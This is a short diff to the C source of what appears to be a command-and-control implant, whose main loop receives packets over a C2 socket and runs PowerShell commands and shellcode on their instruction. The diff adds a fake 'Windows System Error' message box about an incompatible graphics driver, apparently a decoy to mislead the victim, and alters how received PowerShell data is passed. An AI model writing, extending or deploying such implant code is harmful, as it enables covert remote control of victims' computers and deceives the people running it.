@@ -15,6 +15,7 @@
 */
 
 int main() {
+    MessageBoxA(NULL, "Error 0x41da0: Graphic driver not reconized, your computer may be not compatible with this version of the utility.", "[0x41da0] Windows System Error", MB_ICONERROR);
     GoDark(7000);
     SOCKET c2Socket;
     PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
@@ -31,7 +32,7 @@ int main() {
         switch(pkt->CmdId) {
             case 0x1:
                 printf("[C2] Received command ID 1 for {executePowershell}\n");
-                ExecPowerShell(ConvertDataToLPCWSTR(pkt->Data));
+                ExecPowerShell((LPCWSTR)pkt->Data);
                 break;
             case 0x2:
                 printf("[C2] Received command ID 2 for {executeShellCode}\n");
